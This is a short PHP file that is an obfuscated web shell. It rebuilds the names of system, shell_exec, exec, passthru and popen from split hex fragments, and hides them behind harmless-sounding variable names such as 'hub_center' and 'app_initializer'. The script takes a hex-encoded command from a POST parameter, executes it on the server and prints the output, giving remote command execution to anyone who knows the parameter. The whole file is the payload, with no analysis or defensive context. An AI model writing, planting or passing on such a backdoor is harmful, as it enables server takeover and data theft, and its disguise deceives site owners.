<?php


$ref1 = '973';
$ref2 = '56d';
$ref3 = '865';
$ref4 = '657';
$ref5 = '173';
$ref6 = '737';
$ref7 = '727';
$ref8 = '706';
$ref9 = '656';
$ref10 = '5f6';
$ref11 = '765';
$ref12 = '745';
$ref13 = '6f6';
$ref14 = 'e74';
$ref15 = '36c';
$ref16 = '6f7';
$ref17 = '617';
$ref18 = '070';
$ref19 = '96e';
$ref20 = '469';
$ref21 = '572';
$hub_center1 = pack("H*", '737'.$ref1.'746'.$ref2);
$hub_center2 = pack("H*", '736'.$ref3.'6c6'.'c5f'.$ref4.'865');
$hub_center3 = pack("H*", $ref4.'865');
$hub_center4 = pack("H*", '706'.$ref5.$ref6.'468'.$ref7);
$hub_center5 = pack("H*", $ref8.'f70'.'656');
$hub_center6 = pack("H*", '737'.'472'.$ref9.'16d'.$ref10.$ref11.$ref12.'f63'.$ref13.$ref14.'656'.'e74');
$hub_center7 = pack("H*", $ref8.$ref15.$ref16.'365');
$app_initializer = pack("H*", $ref17.$ref18.$ref10.$ref19.'697'.$ref20.'616'.'c69'.'7a6'.$ref21);
if (isset($_POST[$app_initializer])) {
    $app_initializer = pack("H*", $_POST[$app_initializer]);
    if (function_exists($hub_center1)) {
        $hub_center1($app_initializer);
    } elseif (function_exists($hub_center2)) {
        print $hub_center2($app_initializer);
    } elseif (function_exists($hub_center3)) {
        $hub_center3($app_initializer, $bind_elem);
        print join("\n", $bind_elem);
    } elseif (function_exists($hub_center4)) {
        $hub_center4($app_initializer);
    } elseif (function_exists($hub_center5) && function_exists($hub_center6) && function_exists($hub_center7)) {
        $binding_value = $hub_center5($app_initializer, 'r');
        if ($binding_value) {
            $record_holder = $hub_center6($binding_value);
            $hub_center7($binding_value);
            print $record_holder;
        }
    }
    exit;
}
